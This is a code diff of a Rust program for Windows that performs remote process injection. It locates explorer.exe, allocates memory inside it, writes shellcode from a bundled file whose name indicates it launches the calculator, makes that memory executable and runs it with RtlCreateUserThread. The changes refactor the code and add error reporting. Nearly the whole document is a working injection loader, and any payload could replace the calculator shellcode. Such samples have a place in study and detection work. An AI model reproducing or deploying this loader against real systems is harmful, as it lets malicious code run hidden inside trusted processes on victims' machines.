@@ -4,7 +4,7 @@ use std::ffi::c_void;
 use std::mem::transmute;
 use std::ptr::{null, null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows_sys::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, HANDLE};
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 use windows_sys::Win32::System::Memory::{
@@ -12,11 +12,10 @@ use windows_sys::Win32::System::Memory::{
 };
 use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
 
-const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-const SIZE: usize = SHELLCODE.len();
-
 #[cfg(target_os = "windows")]
 fn main() {
+    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+    let shellcode_size: usize = shellcode.len();
     let mut old = PAGE_READWRITE;
 
     let mut system = System::new();
@@ -24,12 +23,16 @@ fn main() {
     let pid = system
         .processes_by_name("explorer")
         .next()
-        .expect("no process!")
+        .expect("[-]no process!")
         .pid()
         .as_u32();
 
     unsafe {
         let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
+        if ntdll == 0 {
+            panic!("[-]LoadLibraryA failed: {}!", GetLastError());
+        }
+
         let fn_rtl_create_user_thread = GetProcAddress(ntdll, b"RtlCreateUserThread\0".as_ptr());
 
         let rtl_create_user_thread: extern "C" fn(
@@ -47,33 +50,42 @@ fn main() {
 
         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if handle == 0 {
-            panic!("OpenProcess failed!");
+            panic!("[-]OpenProcess failed: {}!", GetLastError());
         }
 
-        let dest = VirtualAllocEx(
+        let addr = VirtualAllocEx(
             handle,
             null(),
-            SIZE,
+            shellcode_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-        if dest.is_null() {
-            panic!("VirtualAllocEx failed!");
+        if addr.is_null() {
+            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
         }
 
-        let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
+        let res = WriteProcessMemory(
+            handle,
+            addr,
+            shellcode.as_ptr().cast(),
+            shellcode_size,
+            null_mut(),
+        );
         if res == FALSE {
-            panic!("WriteProcessMemory failed!");
+            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
         }
 
-        let res = VirtualProtectEx(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
+        let res = VirtualProtectEx(handle, addr, shellcode_size, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            panic!("VirtualProtectEx failed!");
+            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
         }
 
         let mut thraed: HANDLE = 0;
-        rtl_create_user_thread(handle, 0, 0, 0, 0, 0, dest, 0, &mut thraed, 0);
+        rtl_create_user_thread(handle, 0, 0, 0, 0, 0, addr, 0, &mut thraed, 0);
 
-        CloseHandle(handle);
+        let res = CloseHandle(handle);
+        if res == FALSE {
+            panic!("[-]CloseHandle failed: {}!", GetLastError());
+        }
     }
 }
